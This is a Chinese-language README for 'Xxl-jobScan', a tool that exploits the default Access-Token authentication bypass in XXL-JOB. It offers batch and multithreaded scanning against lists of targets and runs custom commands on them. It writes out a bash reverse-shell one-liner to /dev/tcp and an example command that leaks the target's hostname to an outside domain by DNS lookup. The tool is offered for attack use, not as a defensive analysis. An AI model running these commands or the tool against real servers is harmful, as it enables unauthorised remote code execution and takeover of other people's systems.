# Xxl-jobScan
Xxl-jobScan 默认Access-Token身份绕过漏洞扫描工具！！！

![image](https://github.com/user-attachments/assets/ff8bb335-c844-41a9-8a48-54067bcb3f26)
# 该工具支持：
1、批量url扫描
2、多线程扫描
3、自定义shell扫描。

# 实例：
## 1、单个url扫描：
python xxl-jobScan.py 127.0.0.1
![image](https://github.com/user-attachments/assets/d19bcb89-030c-4844-9e14-9795adce8aa0)

## 2、批量url扫描,定义20线程扫描（默认10线程）：
python xxl-jobScan.py -f target.txt -t 20

## 3、自定义命令shell：
可以直接弹shell，`bash -i >& /dev/tcp/IP/port 0>&1`
```
python xxl-jobScan.py -f target.txt -shell "ping -c 1 `hostname`.29419fcc17.ipv6.1433.eu.org."
```
![image](https://github.com/user-attachments/assets/f05b59e8-6464-4bcc-9337-5a97f5ff2272)
![image](https://github.com/user-attachments/assets/bd3bbd7f-6dfc-484b-a97b-cc20c8f6c333)
